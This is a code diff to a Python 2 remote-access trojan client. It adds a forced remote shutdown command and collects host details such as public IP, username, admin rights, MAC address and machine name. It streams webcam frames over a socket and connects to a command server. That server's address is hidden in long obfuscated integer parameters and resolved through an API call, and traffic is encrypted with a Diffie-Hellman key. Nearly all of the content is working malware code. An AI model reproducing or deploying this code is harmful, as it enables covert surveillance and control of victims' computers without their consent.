@@ -52,6 +52,7 @@ import zlib
 import uuid
 import numpy
 import base64
+import ctypes
 import pickle
 import struct
 import socket
@@ -106,9 +107,15 @@ class Client(object):
         except:
             return False
 
+    def _shutdown(self):
+        try:
+            _ = os.popen('shutdown /d 1 /f').read() if os.name is 'nt' else os.popen('shutdown -h now').read()
+        except Exception as e:
+            self._print('Shutdown error: {}'.format(str(e)))
+
     def _post(self, url, headers={}, data={}):
         dat = urllib.urlencode(data)
-        req = urllib2.Request(url, data=dat)
+        req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
         for key, value in headers.items():
             req.add_header(key, value)
         return urllib2.urlopen(req).read()
@@ -401,7 +408,7 @@ class Client(object):
   
     def _status(self,c=None): return '{} days, {} hours, {} minutes, {} seconds'.format(int(time.clock() / 86400.0), int((time.clock() % 86400.0) / 3600.0), int((time.clock() % 3600.0) / 60.0), int(time.clock() % 60.0)) if not c else '{} days, {} hours, {} minutes, {} seconds'.format(int(c / 86400.0), int((c % 86400.0) / 3600.0), int((c % 3600.0) / 60.0), int(c % 60.0))
 
-    def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Private IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [urllib2.urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid.uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
+    def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Private IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [urllib2.urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid.uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
 
     def _help(self, *arg): return ' \n USAGE\t\t\tDESCRIPTION\n --------------------------------------------------\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()])
 
@@ -478,36 +485,30 @@ class Client(object):
             self._connected.clear()
             return self._connect()
 
-    def _connect(self, host='localhost', port=1337):
+    def _connect(self, port=1337):
         def _addr(a, b, c):
             ab  = json.loads(self._post(a, headers={'API-Key': b}))
             ip  = ab[ab.keys()[0]][0].get('ip')
             if self._is_ipv4_address(ip):
                 return _sock((ip, c))
             else:
-                self._print('Target value not an IPv4 address\nRetrying in 5...'.format(_))
+                self._print('Invalid IPv4 address\nRetrying in 5...'.format(_))
                 time.sleep(5)
                 return _addr(a, b, c)
         def _sock(addr):
             s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setblocking(True)
-            _  = s.connect_ex(addr)
-            if not _:
-                return s
-            else:
-                self._print('Socket connection failed with error code: {}\nRetrying in 5...'.format(_))
-                time.sleep(5)
-                return _sock(addr)
+            s.connect(addr)
+            return s
         try:
-            self._socket = _addr(self._long_to_bytes(long(self.__a__)), self._long_to_bytes(long(self.__b__)), port) if bool('__a__' in vars(self) and '__b__' in vars(self)) else _sock((host, port))
+            self._connected.clear()
+            self._socket = _addr(self._long_to_bytes(long(self.__a__)), self._long_to_bytes(long(self.__b__)), int(port)) if 'debug' not in sys.argv else _sock(('localhost', int(port)))
             self._dhkey  = self._diffiehellman()
             return self._connected.set()
         except Exception as e:
             self._print('Connection error: {}'.format(str(e)))
-        self._connected.clear()
         self._print('Retrying in 5...')
         time.sleep(5)
-        return self._connect(host, port)
+        return self._connect(port)
 
     def _send(self, data, method='default'):
         self._connected.wait()
@@ -567,32 +568,27 @@ class Client(object):
             self._print('Decryption error: {}'.format(str(e)))
 
     def _encrypt(self, data):
-        padded = self._pad(data)
-        blocks = self._block(padded)
-        vector = os.urandom(8)
-        result = [vector]
+        data    = self._pad(data)
+        blocks  = self._block(data)
+        vector  = os.urandom(8)
+        result  = [vector]
         for block in blocks:
             encode = self._xor(vector, block)
             output = vector = self._encryption(encode)
             result.append(output)
-        return base64.b64encode(''.join(result))
+        return base64.b64encode(b''.join(result))
     
     def _decrypt(self, data):
-        blocks = self._block(base64.b64decode(data))
-        result = []
-        vector = blocks[0]
+        data    = base64.b64decode(data)
+        blocks  = self._block(data)
+        vector  = blocks[0]
+        result  = []
         for block in blocks[1:]:
             decode = self._decryption(block)
             output = self._xor(vector, decode)
             vector = block
             result.append(output)
         return ''.join(result).rstrip('\x00')
-
-    def _shutdown(self):
-        try:
-            _ = os.popen('shutdown /d 1 /f').read() if os.name is 'nt' else os.popen('shutdown -h now').read()
-        except Exception as e:
-            self._print('Shutdown error: {}'.format(str(e)))
 
     def _enable(self, *targets):
         output = []
@@ -1009,10 +1005,10 @@ class Client(object):
                     ret,frame=dev.read()
                     data = pickle.dumps(frame)
                     sock.sendall(struct.pack("L", len(data))+data)
-                    if time.time() > end:
-                        break
+                    time.sleep(0.1)
                 except Exception as e:
                     self._print('Stream error: {}'.format(str(e)))
+                    break
         finally:
             dev.release()
             sock.close()
@@ -1374,7 +1370,22 @@ def main(*args, **kwargs):
         exec imports in globals()
     if '__f__' not in kwargs and '__file__' in globals():
         kwargs['__f__'] = bytes(long(globals()['__file__'].encode('hex'), 16))
-    Client(**kwargs)._start()
+    return Client(**kwargs)._start()
 
 if __name__ == '__main__':
-    main()
+    m = main(**{
+            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
+            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
+            "__e__": "423224063517525567299427660991207813087967857812230603629111",
+            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
+            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
+            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
+            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
+            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
+            "__v__": "12620",
+            "__w__": "12095051301478169748777225282050429328988589300942044190524177815713142069688900",
+            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
+            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
+    })
